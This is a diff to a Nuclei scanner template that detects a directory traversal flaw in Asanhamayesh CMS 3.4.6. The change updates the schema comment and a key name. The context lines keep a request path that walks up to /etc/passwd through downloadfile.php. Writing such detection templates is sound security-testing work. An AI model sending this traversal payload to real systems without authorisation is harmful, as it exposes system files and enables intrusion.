@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: asanhamayesh-lfi
 info:
   name: Asanhamayesh CMS 3.4.6 Directory traversal Vulnerability
@@ -7,7 +8,7 @@ info:
     - https://cxsecurity.com/issue/WLB-2018030006
     - https://asanhamayesh.com
   tags: asanhamayesh,lfi,traversal
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/downloadfile.php?file=../../../../../../../../../../etc/passwd"
